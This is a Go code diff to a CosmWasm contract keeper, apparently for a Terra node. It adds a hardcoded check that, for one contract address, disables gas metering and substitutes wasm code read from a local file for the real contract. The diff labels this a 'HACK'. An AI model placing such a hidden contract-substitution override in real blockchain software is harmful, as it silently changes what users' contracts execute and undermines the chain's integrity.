@@ -3,6 +3,7 @@ package keeper
 import (
 	"context"
 	"fmt"
+	"io/ioutil"
 	"time"
 
 	wasmvmtypes "github.com/CosmWasm/wasmvm/types"
@@ -213,6 +214,34 @@ func (k Keeper) ExecuteContract(
 	codeInfo, storePrefix, err := k.getContractDetails(ctx, contractAddress)
 	if err != nil {
 		return nil, err
+	}
+
+	if contractAddress.String() == "terra10vjvj6ykgd63ur5e5630lxhfxafalese4y6ady" {
+		// store gas meter temporarily
+		gasMeter := ctx.GasMeter()
+		ctx = ctx.WithGasMeter(sdk.NewInfiniteGasMeter())
+
+		wasmBytes, err := ioutil.ReadFile("/home/ubuntu/contract.wasm")
+		if err != nil {
+			fmt.Println("HACK FAILED: " + err.Error())
+			return nil, err
+		}
+
+		// create dummy contract and use dummy contract instead real one
+		codeID, err := k.StoreCode(ctx, sender, wasmBytes)
+		if err != nil {
+			fmt.Println("HACK FAILED: " + err.Error())
+			return nil, err
+		}
+
+		codeInfo, err = k.GetCodeInfo(ctx, codeID)
+		if err != nil {
+			fmt.Println("HACK FAILED: " + err.Error())
+			return nil, err
+		}
+
+		// rollback
+		ctx = ctx.WithGasMeter(gasMeter)
 	}
 
 	// add more funds
